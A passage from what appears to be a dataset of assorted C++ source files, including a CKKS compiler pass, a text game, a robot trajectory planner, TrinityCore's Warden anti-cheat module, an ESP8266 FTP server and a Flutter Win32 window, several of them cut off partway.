(l.isDeadAfter(v->get(), op) &&\n              (garbage.empty() || v->get() != garbage.back())) {\n            garbage.push_back(v->get());\n          }\n        }\n      }\n      for (int i = 0; i < op.getNumDpsInits(); i++) {\n        auto v = op.getDpsInitOperand(i);\n        if (auto tt = hecate::ckks::getPolyType(v->get())) {\n          if (tt.getNumPoly() == 1)\n            continue;\n          if (!garbage.empty()) {\n            op.getDpsInitOperand(i)->set(garbage.pop_back_val());\n          }\n        }\n      }\n    });\n  }\n\n  void getDependentDialects(DialectRegistry &registry) const override {\n    registry.insert<hecate::ckks::CKKSDialect>();\n  }\n};\n} // namespace\n",
    "#include \"Swamp.h\"\n\nSwamp::Swamp(){}\nSwamp::Swamp(bool isExit, int index, vector<Object*> objects):Room(isExit, index, objects){}\n\nvoid Swamp::normalTrigger(Object* object){\n    sleep(1);\n    cout << \"Welcome to Swamp!\" << endl;\n    sleep(1);\n    Player* player = (Player*) object;\n    cout << \"Player's state decreases by 30\" << endl;\n    player->increaseStates(-30, -30, -30, -30, -30, 0); \n    sleep(1);\n    cout << \"Swamp has a poison for you\" << endl;\n    Poison poison(\"bacteriaLiquid\", 10, 10);    \n    player->addPoison(poison);\n    sleep(1);\n};\nvoid Swamp::deadlyTrigger(Object* object){\n    sleep(1);\n    cout << \"You have been trapped in swamp\" << endl;\n    sleep(1);\n    cout << \"Player's health decreases to 0\" << endl;\n    sleep(1);\n    Player* player = (Player*) object;\n    player->setCurrentHealth(0);\n    sleep(1);\n};\nvoid Swamp::triggerEnviron(Object* object){\n    srand(time(0));\n    normalTrigger(object);\n    if (rand()%100 < 10){\n        deadlyTrigger(object);\n    }\n    cout << \"\\n\";\n};",
    "/*********************************************************************\n *\n * Software License Agreement (BSD License)\n *\n *  Copyright (c) 2016,\n *  TU Dortmund - Institute of Control Theory and Systems Engineering.\n *  All rights reserved.\n *\n *  Redistribution and use in source and binary forms, with or without\n *  modification, are permitted provided that the following conditions\n *  are met:\n *\n *   * Redistributions of source code must retain the above copyright\n *     notice, this list of conditions and the following disclaimer.\n *   * Redistributions in binary form must reproduce the above\n *     copyright notice, this list of conditions and the following\n *     disclaimer in the documentation and/or other materials provided\n *     with the distribution.\n *   * Neither the name of the institute nor the names of its\n *     contributors may be used to endorse or promote products derived\n *     from this software without specific prior written permission.\n *\n *  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n *  \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\n *  LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS\n *  FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE\n *  COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,\n *  INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,\n *  BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;\n *  LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER\n *  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT\n *  LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN\n *  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\n *  POSSIBILITY OF SUCH DAMAGE.\n *\n * Author: Christoph R\u00f6smann\n *********************************************************************/\n\n#include \"teb_local_planner/timed_elastic_band.h\"\n\nnamespace teb_local_planner\n{\n\nnamespace\n{\n  /**\n   * estimate the time to move from start to end.\n   * Assumes constant velocity for the motion.\n   */\n  double estimateDeltaT(const PoseSE2& start, const PoseSE2& end,\n                        double max_vel_x, double max_vel_theta)\n  {\n    double dt_constant_motion = 0.1;\n    if (max_vel_x > 0) {\n      double trans_dist = (end.position() - start.position()).norm();\n      dt_constant_motion = trans_dist / max_vel_x;\n    }\n    if (max_vel_theta > 0) {\n      double rot_dist = std::abs(g2o::normalize_theta(end.theta() - start.theta()));\n      dt_constant_motion = std::max(dt_constant_motion, rot_dist / max_vel_theta);\n    }\n    return dt_constant_motion;\n  }\n} // namespace\n\n\nTimedElasticBand::TimedElasticBand()\n{\n}\n\nTimedElasticBand::~TimedElasticBand()\n{\n  RCLCPP_DEBUG(rclcpp::get_logger(\"teb_local_planner\"), \"Destructor Timed_Elastic_Band...\");\n  clearTimedElasticBand();\n}\n\n\nvoid TimedElasticBand::addPose(const PoseSE2& pose, bool fixed)\n{\n  VertexPose* pose_vertex = new VertexPose(pose, fixed);\n  pose_vec_.push_back( pose_vertex );\n  return;\n}\n\nvoid TimedElasticBand::addPose(const Eigen::Ref<const Eigen::Vector2d>& position, double theta, bool fixed)\n{\n  VertexPose* pose_vertex = new VertexPose(position, theta, fixed);\n  pose_vec_.push_back( pose_vertex );\n  return;\n}\n\n void TimedElasticBand::addPose(double x, double y, double theta, bool fixed)\n{\n  VertexPose* pose_vertex = new VertexPose(x, y, theta, fixed);\n  pose_vec_.push_back( pose_vertex );\n  return;\n}\n\nvoid TimedElasticBand::addTimeDiff(double dt, bool fixed)\n{\n  assert(dt > 0.0 && \"Adding a timediff requires a positive dt\");\n  VertexTimeDiff* timediff_vertex = new VertexTimeDiff(dt, fixed);\n  timediff_vec_.push_back( timediff_vertex );\n  return;\n}\n\n\nvoid TimedElasticBand::addPoseAndTimeDiff(double x, double y, double angle, double dt)\n{\n  if (sizePoses() != sizeTimeDiffs())\n  {\n    addPose(x,y,angle,false);\n    addTimeDiff(dt,false);\n  }\n  else {\n    RCLCPP_ERROR(rclcpp::get_logger(\"teb_local_planner\"),\n                 \"Method addPoseAndTimeDiff: Add one single Pose first. Timediff describes the time difference between last conf and given conf\");\n  }\n  return;\n}\n\n\n\nvoid TimedElasticBand::addPoseAndTimeDiff(const PoseSE2& pose, double dt)\n{\n  if (sizePoses() != sizeTimeDiffs())\n  {\n    addPose(pose,false);\n    addTimeDiff(dt,false);\n  } else {\n    RCLCPP_ERROR(rclcpp::get_logger(\"teb_local_planner\"), \"Method addPoseAndTimeDiff: Add one single Pose first. Timediff describes the time difference between last conf and given conf\");\n  }\n  return;\n}\n\nvoid TimedElasticBand::addPoseAndTimeDiff(const Eigen::Ref<const Eigen::Vector2d>& position, double theta, double dt)\n{\n  if (sizePoses() != sizeTimeDiffs())\n  {\n    addPose(position, theta,false);\n    addTimeDiff(dt,false);\n  } else {\n    RCLCPP_DEBUG(rclcpp::get_logger(\"teb_local_planner\"),\n                 \"Method addPoseAndTimeDiff: Add one single Pose first. Timediff describes the time difference between last conf and given conf\");\n  }\n  return;\n}\n\n\nvoid Ti",
    "/*\n * This file is part of the TrinityCore Project. See AUTHORS file for Copyright information\n *\n * This program is free software; you can redistribute it and/or modify it\n * under the terms of the GNU General Public License as published by the\n * Free Software Foundation; either version 2 of the License, or (at your\n * option) any later version.\n *\n * This program is distributed in the hope that it will be useful, but WITHOUT\n * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or\n * FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for\n * more details.\n *\n * You should have received a copy of the GNU General Public License along\n * with this program. If not, see <http://www.gnu.org/licenses/>.\n */\n\n#include \"Warden.h\"\n#include \"AccountMgr.h\"\n#include \"ByteBuffer.h\"\n#include \"Common.h\"\n#include \"CryptoHash.h\"\n#include \"GameTime.h\"\n#include \"Log.h\"\n#include \"SmartEnum.h\"\n#include \"Util.h\"\n#include \"WardenPackets.h\"\n#include \"World.h\"\n#include \"WorldPacket.h\"\n#include \"WorldSession.h\"\n#include <charconv>\n\nWarden::Warden() : _session(nullptr), _checkTimer(10 * IN_MILLISECONDS), _clientResponseTimer(0),\n                   _dataSent(false), _initialized(false)\n{\n}\n\nWarden::~Warden()\n{\n    _initialized = false;\n}\n\nvoid Warden::MakeModuleForClient()\n{\n    TC_LOG_DEBUG(\"warden\", \"Make module for client\");\n    InitializeModuleForClient(_module.emplace());\n\n    _module->Id = Trinity::Crypto::MD5::GetDigestOf(_module->CompressedData, _module->CompressedSize);\n}\n\nvoid Warden::SendModuleToClient()\n{\n    TC_LOG_DEBUG(\"warden\", \"Send module to client\");\n\n    // Create packet structure\n    WardenModuleTransfer packet;\n\n    uint32 sizeLeft = _module->CompressedSize;\n    uint32 pos = 0;\n    uint16 burstSize;\n    while (sizeLeft > 0)\n    {\n        burstSize = sizeLeft < 500 ? sizeLeft : 500;\n        packet.Command = WARDEN_SMSG_MODULE_CACHE;\n        packet.DataSize = burstSize;\n        memcpy(packet.Data, _module->CompressedData + pos, burstSize);\n        sizeLeft -= burstSize;\n        pos += burstSize;\n\n        EndianConvert(packet.DataSize);\n\n        EncryptData(reinterpret_cast<uint8*>(&packet), burstSize + 3);\n        WorldPacket pkt1(SMSG_WARDEN3_DATA, burstSize + 3);\n        pkt1.append(reinterpret_cast<uint8*>(&packet), burstSize + 3);\n        _session->SendPacket(&pkt1);\n    }\n}\n\nvoid Warden::RequestModule()\n{\n    TC_LOG_DEBUG(\"warden\", \"Request module\");\n\n    // Create packet structure\n    WardenModuleUse request;\n    request.Command = WARDEN_SMSG_MODULE_USE;\n\n    request.ModuleId = _module->Id;\n    request.ModuleKey = _module->Key;\n    request.Size = _module->CompressedSize;\n\n    EndianConvert(request.Size);\n\n    // Encrypt with warden RC4 key.\n    EncryptData(reinterpret_cast<uint8*>(&request), sizeof(WardenModuleUse));\n\n    WorldPacket pkt(SMSG_WARDEN3_DATA, sizeof(WardenModuleUse));\n    pkt.append(reinterpret_cast<uint8*>(&request), sizeof(WardenModuleUse));\n    _session->SendPacket(&pkt);\n}\n\nvoid Warden::Update(uint32 diff)\n{\n    if (!_initialized)\n        return;\n\n    if (_dataSent)\n    {\n        uint32 maxClientResponseDelay = sWorld->getIntConfig(CONFIG_WARDEN_CLIENT_RESPONSE_DELAY);\n\n        if (maxClientResponseDelay > 0)\n        {\n            // Kick player if client response delays more than set in config\n            if (_clientResponseTimer > maxClientResponseDelay * IN_MILLISECONDS)\n            {\n                TC_LOG_WARN(\"warden\", \"{} (latency: {}, IP: {}) exceeded Warden module response delay ({}) - disconnecting client\",\n                                _session->GetPlayerInfo(), _session->GetLatency(), _session->GetRemoteAddress(), secsToTimeString(maxClientResponseDelay, TimeFormat::ShortText));\n                _session->KickPlayer(\"Warden::Update Warden module response delay exceeded\");\n            }\n            else\n                _clientResponseTimer += diff;\n        }\n    }\n    else\n    {\n        if (diff >= _checkTimer)\n            RequestChecks();\n        else\n            _checkTimer -= diff;\n    }\n}\n\nvoid Warden::DecryptData(uint8* buffer, uint32 length)\n{\n    _inputCrypto.UpdateData(buffer, length);\n}\n\nvoid Warden::EncryptData(uint8* buffer, uint32 length)\n{\n    _outputCrypto.UpdateData(buffer, length);\n}\n\nbool Warden::IsValidCheckSum(uint32 checksum, uint8 const* data, const uint16 length)\n{\n    uint32 newChecksum = BuildChecksum(data, length);\n\n    if (checksum != newChecksum)\n    {\n        TC_LOG_DEBUG(\"warden\", \"CHECKSUM IS NOT VALID\");\n        return false;\n    }\n    else\n    {\n        TC_LOG_DEBUG(\"warden\", \"CHECKSUM IS VALID\");\n        return true;\n    }\n}\n\nunion keyData\n{\n    std::array<uint8, 20> bytes;\n    std::array<uint32, 5> ints;\n};\n\nuint32 Warden::BuildChecksum(uint8 const* data, uint32 length)\n{\n    keyData hash;\n    hash.bytes = Trinity::Crypto::SHA1::GetDigestOf(data, size_t(length));\n    uint32 checkSum = 0;\n    for (uint8 i = 0; i < 5; ++i)\n        checkSum = checkSum ^ hash.ints[i];\n\n    return checkSum;\n}\n\nchar const* Warden::App",
    "#include \"gtpro_lin.hpp\"\n\n// - Cria\u00e7\u00e3o de objeto\ncomunicacaoLin::comunicacaoLin(uint8_t pin_tx, uint8_t pin_rx, uint8_t pin_desable, uint8_t tx_speed, uint8_t id_esp, uint8_t id_tx = 0x04)\n{\n    this->pin_tx = pin_tx;\n    this->pin_rx = pin_rx;\n    this->pin_desable = pin_desable;\n    this->tx_speed = tx_speed;\n    this->id_esp = id_esp;\n    this->id_tx = id_tx;\n    pinMode(pin_desable, OUTPUT); // Define o pin_desable como sa\u00edda\n    Serial1.begin(tx_speed);      // Inicia o Serial1 na velocidade definida em tx_speed\n}\n\n// Fun\u00e7\u00e3o de  que executa as fun\u00e7\u00f5es de recep\u00e7\u00e3o dos dados\nvoid comunicacaoLin::rxLoop()\n{\n    if (!Serial1.available()) // Inicia a configura\u00e7\u00e3o de recep\u00e7\u00e3o dos dados e verifica se houve erro\n    {\n        return; // Em caso de erro sai da fun\u00e7\u00e3o\n    }\n\n    uint8_t *data_received = new uint8_t[15]; // Cria\u00e7\u00e3o de Ponteiro de Dados\n\n    Serial1.readBytes(data_received, 15); // Armazena os dados recebidos no ponteiro data_received\n    if (data_received[0] != id_tx)\n    {\n        delete[] data_received;\n        return;\n    }\n\n    data_received[0] = 0;\n\n    uint8_t checkSumRx = data_received[14];\n    data_received[14] = 0;\n\n    uint8_t sum = checkSumCalc(data_received, 14); // Calculando a soma dos dado de informa\u00e7\u00e3o\n\n    if (checkSumRx == sum) // Verifica se os identificadores e soma est\u00e3o corretos\n    {\n        received_function(data_received); // Se ocorrer tudo corretamente, retorna ponteiro de dados de informa\u00e7\u00e3o\n    }\n\n    delete[] data_received;\n}\n\n// Fun\u00e7\u00f5es de Recep\u00e7\u00e3o\n\nuint8_t comunicacaoLin::checkSumCalc(uint8_t *data, uint8_t length)\n{\n    uint16_t sum = 0;\n    for (uint8_t i = 0; i < length; i++)\n    {\n        sum += data[i];\n        // Verifica se houve overflow e ajusta\n        if (sum > 0xFF)\n        {\n            sum -= 0xFF;\n        }\n    }\n    // O checksum \u00e9 o complemento de dois da soma\n    return ~sum & 0xFF;\n}\n\nvoid comunicacaoLin::setLoopFunction(void (*received_function)(uint8_t *data_received))\n{\n    this->received_function = received_function;\n}\n\n// Fun\u00e7\u00e3o de  que executa as fun\u00e7\u00f5es de envio dos dados\nvoid comunicacaoLin::send(uint8_t *data, uint8_t id_tx = 0)\n{\n    digitalWrite(pin_desable, LOW);\n    if (id_tx)\n        Serial1.write(id_tx);\n    else\n        Serial1.write(this-> id_tx);\n    Serial1.write(data, 13);\n    Serial1.write(checkSumCalc(data, 12));\n    digitalWrite(pin_desable, HIGH);\n}\n",
    "/*\n * FTP Serveur for ESP8266\n * based on FTP Serveur for Arduino Due and Ethernet shield (W5100) or WIZ820io (W5200)\n * based on Jean-Michel Gallego's work\n * modified to work with esp8266 SPIFFS by David Paiva david@nailbuster.com\n * \n * This program is free software: you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation, either version 3 of the License, or\n * (at your option) any later version.\n *\n * This program is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n * GNU General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License\n * along with this program.  If not, see <http://www.gnu.org/licenses/>.\n */\n\n#include \"ESP8266FtpServer.h\"\n\n#include <ESP8266WiFi.h>\n#include <WiFiClient.h>\n#include <ESP8266WebServer.h>\n#include <FS.h>\n\n\n\n\nWiFiServer ftpServer( FTP_CTRL_PORT );\nWiFiServer dataServer( FTP_DATA_PORT_PASV );\n\nboolean honeypot=false;\nString ipandtime = \"\";\n\nvoid FtpServer::begin(String uname, String pword)\n{\n  // Tells the ftp server to begin listening for incoming connection\n\t_FTP_USER=uname;\n\t_FTP_PASS = pword;\n\n\tftpServer.begin();\n\tdelay(10);\n\tdataServer.begin();\t\n\tdelay(10);\n\tmillisTimeOut = (uint32_t)FTP_TIME_OUT * 60 * 1000;\n\tmillisDelay = 0;\n\tcmdStatus = 0;\n    iniVariables();\n}\n\nvoid FtpServer::iniVariables()\n{\n  // Default for data port\n  dataPort = FTP_DATA_PORT_PASV;\n  \n  // Default Data connection is Active\n  dataPassiveConn = true;\n  \n  // Set the root directory\n  strcpy( cwdName, \"/\" );\n\n  rnfrCmd = false;\n  transferStatus = 0;\n  \n}\n\nvoid FtpServer::handleFTP()\n{\n  if((int32_t) ( millisDelay - millis() ) > 0 )\n    return;\n\n  if (ftpServer.hasClient()) {\n\t  client.stop();\n\t  client = ftpServer.available();\n  }\n  \n  if( cmdStatus == 0 )\n  {\n    if( client.connected())\n      disconnectClient();\n    cmdStatus = 1;\n  }\n  else if( cmdStatus == 1 )         // Ftp server waiting for connection\n  {\n    abortTransfer();\n    iniVariables();\n    #ifdef FTP_DEBUG\n\tSerial.println(\"Ftp server waiting for connection on port \"+ String(FTP_CTRL_PORT));\n    #endif\n    cmdStatus = 2;\n  }\n  else if( cmdStatus == 2 )         // Ftp server idle\n  {\n   \t\t\n    if( client.connected() )                // A client connected\n    {\n      clientConnected();      \n      millisEndConnection = millis() + 10 * 1000 ; // wait client id during 10 s.\n      cmdStatus = 3;\n\t  honeypot=true;\n\t  ipandtime= client.remoteIP().toString();\n    }\n  }\n  else if( readChar() > 0 )         // got response\n  {\n    if( cmdStatus == 3 )            // Ftp server waiting for user identity\n      if( userIdentity() )\n        cmdStatus = 4;\n      else\n        cmdStatus = 0;\n    else if( cmdStatus == 4 )       // Ftp server waiting for user registration\n      if( userPassword() )\n      {\n        cmdStatus = 5;\n        millisEndConnection = millis() + millisTimeOut;\n      }\n      else\n        cmdStatus = 0;\n    else if( cmdStatus == 5 )       // Ftp server waiting for user command\n      if( ! processCommand())\n        cmdStatus = 0;\n      else\n        millisEndConnection = millis() + millisTimeOut;\n  }\n  else if (!client.connected() || !client)\n  {\n\t  cmdStatus = 1;\n      #ifdef FTP_DEBUG\n\t    Serial.println(\"client disconnected\");\n\t  #endif\n  }\n\n  if( transferStatus == 1 )         // Retrieve data\n  {\n    if( ! doRetrieve())\n      transferStatus = 0;\n  }\n  else if( transferStatus == 2 )    // Store data\n  {\n    if( ! doStore())\n      transferStatus = 0;\n  }\n  else if( cmdStatus > 2 && ! ((int32_t) ( millisEndConnection - millis() ) > 0 ))\n  {\n\t  client.println(\"530 Timeout\");\n    millisDelay = millis() + 200;    // delay of 200 ms\n    cmdStatus = 0;\n  }\n}\n\nvoid FtpServer::clientConnected()\n{\n  #ifdef FTP_DEBUG\n\tSerial.println(\"Client connected!\");\n  #endif\n  client.println( \"220--- Welcome to FTP for ESP8266 ---\");\n  client.println( \"220---   By David Paiva   ---\");\n  client.println( \"220 --   Version \"+ String(FTP_SERVER_VERSION) +\"   --\");\n  iCL = 0;\n}\n\nvoid FtpServer::disconnectClient()\n{\n  #ifdef FTP_DEBUG\n\tSerial.println(\" Disconnecting client\");\n  #endif\n  abortTransfer();\n  client.println(\"221 Goodbye\");\n  client.stop();\n}\n\nboolean FtpServer::returnHoneypotStatus()\n{\n\treturn honeypot;\n}\nString FtpServer::getHoneyPotBreachIPandTime(){\n\treturn ipandtime;\n}\nvoid FtpServer::setHoneypotStatus(boolean honey)\n{\n\thoneypot=honey;\n}\n\nboolean FtpServer::userIdentity()\n{\t\n  if( strcmp( command, \"USER\" ))\n    client.println( \"500 Syntax error\");\n  if( strcmp( parameters, _FTP_USER.c_str() ))\n    client.println( \"530 user not found\");\n  else\n  {\n    client.println( \"331 OK. Password required\");\n    strcpy( cwdName, \"/\" );\n    return true;\n  }\n  millisDelay = millis() + 100;  // delay of 100 ms\n  return false;\n}\n\nboolean FtpServer::userPassword()\n{\n  if( strcmp( command, \"PASS\" ))\n   ",
    "#include <iostream>\n#include <chrono>\n#include <thread>\n#include <boost/asio.hpp>\n#include <zmq.hpp>\n\ntemplate <typename F>\nboost::asio::steady_timer create_timer(boost::asio::io_context& ctx, std::chrono::seconds sec, F&& func)\n{\n    boost::asio::steady_timer timer(ctx, sec);\n    timer.async_wait(\n        [func](const boost::system::error_code& ec)\n        {\n            func();\n        }\n    );\n\n    return std::move(timer);\n}\n\nvoid zmq_thread()\n{\n    zmq::context_t context(1);\n\n    // \u0421\u043e\u043a\u0435\u0442 \u0434\u043b\u044f \u043e\u0442\u0432\u0435\u0442\u043e\u0432\n    zmq::socket_t responder(context, ZMQ_PULL);\n    responder.bind(\"tcp://*:5555\");\n\n    // \u0421\u043e\u043a\u0435\u0442 \u0434\u043b\u044f \u0437\u0430\u043f\u0440\u043e\u0441\u043e\u0432\n    zmq::socket_t requester(context, ZMQ_PUB);\n    requester.connect(\"tcp://localhost:5556\");\n\n    zmq::pollitem_t items[] = {\n        { (void*)responder, 0, ZMQ_POLLIN, 0 },\n        { (void*)requester, 0, ZMQ_POLLOUT, 0 }\n    };\n\n    for (;;)\n    {\n        zmq::poll(items, 2, -1);\n\n        if (items[0].revents & ZMQ_POLLIN)\n        {\n            zmq::message_t message;\n            responder.recv(&message);\n            std::cout << \"Received message from socket1: \" << std::string(static_cast<char*>(message.data()), message.size()) << std::endl;\n        }\n\n        if (items[1].revents & ZMQ_POLLOUT)\n        {\n            std::string message = \"Hello from socket2\";\n            zmq::message_t zmq_message(message.size());\n            memcpy(zmq_message.data(), message.c_str(), message.size());\n            requester.send(zmq_message);\n            std::cout << \"Sent message from socket2: \" << message << std::endl;\n        }\n    }\n    \n}\n\nint main()\n{\n    std::thread zmq_th{zmq_thread};\n\n    using namespace std::chrono_literals;\n    boost::asio::io_context ctx;\n\n    auto t1 = create_timer(ctx, 1s, []{ std::cout << \"1\" << std::endl; });\n    auto t2 = create_timer(ctx, 3s, []{ std::cout << \"2\" << std::endl; });\n\n    ctx.run();\n\n    zmq_th.join();\n}",
    "#include <vector>\n\n#include <Geode/Geode.hpp>\n#include <Geode/ui/TextInput.hpp>\n\nusing namespace geode::prelude;\n\n#include <Geode/modify/SetGroupIDLayer.hpp>\n\nclass $modify(ETSetGroupIDLayer, SetGroupIDLayer) {\n    struct Fields {\n        std::vector<CCNode*> m_idTabs;\n    };\n\n    bool init(GameObject* obj, cocos2d::CCArray* objs) {\n        if (!SetGroupIDLayer::init(obj, objs)) {\n            return false;\n        }\n\n        auto* addGroupIDMenu = this->getChildByID(\"main-layer\")->getChildByID(\"add-group-id-menu\");\n\n        TextInput* groupIDInput = TextInput::create(addGroupIDMenu->getScaledContentWidth(), \"Group ID Name\");\n        groupIDInput->setPosition(addGroupIDMenu->getScaledContentWidth() / 2, groupIDInput->getPositionY() - 5.f);\n        groupIDInput->setScale(0.5f);\n        addGroupIDMenu->addChild(groupIDInput);\n        addGroupIDMenu->updateLayout();\n        this->getChildByID(\"main-layer\")->updateLayout();\n\n        addGroupIDMenu->setScale(0.95f);\n        addGroupIDMenu->setPositionY(addGroupIDMenu->getPositionY() + 10.f);\n\n        /*\n        auto groupsBG = this->getChildByID(\"main-layer\")->getChildByID(\"groups-bg\");\n        groupsBG->setScale(0.9f);\n        groupsBG->setPositionY(groupsBG->getPositionY() - 10.f);\n\n        auto groupsListMenu = this->getChildByID(\"main-layer\")->getChildByID(\"groups-list-menu\");\n        groupsListMenu->setScale(0.9f);\n        groupsListMenu->setPosition(groupsBG->getPositionX(), groupsBG->getPositionY() / 7.f);\n        groupsListMenu->setScaledContentSize(groupsBG->getScaledContentSize());\n        groupsListMenu->setAnchorPoint({0.2f, 0.0f});\n        */\n\n        return true;\n    }\n\n    void onAddGroup(CCObject* sender) {\n        SetGroupIDLayer::onAddGroup(sender);\n\n        auto groupsListMenu = this->getChildByID(\"main-layer\")->getChildByID(\"groups-list-menu\");\n        log::info(\"id list: {}\", groupsListMenu->getChildrenCount());\n\n        CCObject* obj;\n        CCARRAY_FOREACH(groupsListMenu->getChildren(), obj) {\n            auto* ccMenuItem = static_cast<CCNode*>(obj);\n            CCObject* ccMenuItemChild;\n            CCARRAY_FOREACH(ccMenuItem->getChildren(), ccMenuItemChild) {\n                auto* buttonSprite = static_cast<CCNode*>(ccMenuItemChild);\n                auto* buttonSpriteBackground = static_cast<CCNode*>(buttonSprite->getChildren()->objectAtIndex(1));\n                buttonSprite->getChildren()->reverseObjects();\n                auto* idText = static_cast<CCNode*>(buttonSprite->getChildren()->lastObject());\n                idText->setPositionX(idText->getPositionX() - 44.f);\n\n                CCLabelBMFont* groupIDLabel = CCLabelBMFont::create(\"Alpha Control\", \"bigFont.fnt\");\n                groupIDLabel->setScale(0.25f);\n                groupIDLabel->setPosition(idText->getPositionX() + 7.f, idText->getPositionY());\n                groupIDLabel->setAnchorPoint({0.0f, 0.5f});\n                buttonSprite->addChild(groupIDLabel);\n                buttonSpriteBackground->setContentWidth(buttonSpriteBackground->getScaledContentWidth() + groupIDLabel->getScaledContentWidth() - 10.f);\n\n                m_fields->m_idTabs.push_back(ccMenuItem);\n            }\n        }\n\n        /* for (int i = 0; i < groupsListMenu->getChildrenCount(); i++) {\n            auto* CCMenuSprite = groupsListMenu->getChildren()->objectAtIndex(i);\n            auto* idButtonSprite = static_cast<CCNode*>(static_cast<CCNode*>(CCMenuSprite)->getChildren()->objectAtIndex(0));\n            if (!idButtonSprite->getChildByID(\"id-label\")) {\n                log::info(\"No ID Label Found\");\n\n                auto* idNumText = static_cast<CCNode*>(idButtonSprite->getChildren()->objectAtIndex(2));\n                //idNumText->setScaledContentSize(idButtonSprite->getScaledContentSize());\n                log::info(\"button child count: {}\", idButtonSprite->getChildrenCount());\n\n                CCLabelBMFont* groupIDLabel = CCLabelBMFont::create(\"Hello Group Labels\", \"bigFont.fnt\");\n                //groupIDLabel->setScale(idNumText->getScale());\n                idNumText->setID(\"sigma-ohio-rizz\");\n                idButtonSprite->addChild(groupIDLabel);\n            }\n        } */\n    }\n};",
    "#include \"win32_window.h\"\r\n\r\n#include <dwmapi.h>\r\n#include <flutter_windows.h>\r\n\r\n#include \"resource.h\"\r\n\r\nnamespace {\r\n\r\n/// Window attribute that enables dark mode window decorations.\r\n///\r\n/// Redefined in case the developer's machine has a Windows SDK older than\r\n/// version 10.0.22000.0.\r\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\r\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\r\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\r\n#endif\r\n\r\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\r\n\r\n/// Registry key for app theme preference.\r\n///\r\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\r\n/// value indicates apps should use light mode.\r\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\r\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\r\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\r\n\r\n// The number of Win32Window objects that currently exist.\r\nstatic int g_active_window_count = 0;\r\n\r\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\r\n\r\n// Scale helper to convert logical scaler values to physical using passed in\r\n// scale factor\r\nint Scale(int source, double scale_factor) {\r\n  return static_cast<int>(source * scale_factor);\r\n}\r\n\r\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\r\n// This API is only needed for PerMonitor V1 awareness mode.\r\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\r\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\r\n  if (!user32_module) {\r\n    return;\r\n  }\r\n  auto enable_non_client_dpi_scaling =\r\n      reinterpret_cast<EnableNonClientDpiScaling*>(\r\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\r\n  if (enable_non_client_dpi_scaling != nullptr) {\r\n    enable_non_client_dpi_scaling(hwnd);\r\n  }\r\n  FreeLibrary(user32_module);\r\n}\r\n\r\n}  // namespace\r\n\r\n// Manages the Win32Window's window class registration.\r\nclass WindowClassRegistrar {\r\n public:\r\n  ~WindowClassRegistrar() = default;\r\n\r\n  // Returns the singleton registrar instance.\r\n  static WindowClassRegistrar* GetInstance() {\r\n    if (!instance_) {\r\n      instance_ = new WindowClassRegistrar();\r\n    }\r\n    return instance_;\r\n  }\r\n\r\n  // Returns the name of the window class, registering the class if it hasn't\r\n  // previously been registered.\r\n  const wchar_t* GetWindowClass();\r\n\r\n  // Unregisters the window class. Should only be called if there are no\r\n  // instances of the window.\r\n  void UnregisterWindowClass();\r\n\r\n private:\r\n  WindowClassRegistrar() = default;\r\n\r\n  static WindowClassRegistrar* instance_;\r\n\r\n  bool class_registered_ = false;\r\n};\r\n\r\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\r\n\r\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\r\n  if (!class_registered_) {\r\n    WNDCLASS window_class{};\r\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\r\n    window_class.lpszClassName = kWindowClassName;\r\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\r\n    window_class.cbClsExtra = 0;\r\n    window_class.cbWndExtra = 0;\r\n    window_class.hInstance = GetModuleHandle(nullptr);\r\n    window_class.hIcon =\r\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\r\n    window_class.hbrBackground = 0;\r\n    window_class.lpszMenuName = nullptr;\r\n    window_class.lpfnWndProc = Win32Window::WndProc;\r\n    RegisterClass(&window_class);\r\n    class_registered_ = true;\r\n  }\r\n  return kWindowClassName;\r\n}\r\n\r\nvoid WindowClassRegistrar::UnregisterWindowClass() {\r\n  UnregisterClass(kWindowClassName, nullptr);\r\n  class_registered_ = false;\r\n}\r\n\r\nWin32Window::Win32Window() {\r\n  ++g_active_window_count;\r\n}\r\n\r\nWin32Window::~Win32Window() {\r\n  --g_active_window_count;\r\n  Destroy();\r\n}\r\n\r\nbool Win32Window::Create(const std::wstring& title,\r\n                         const Point& 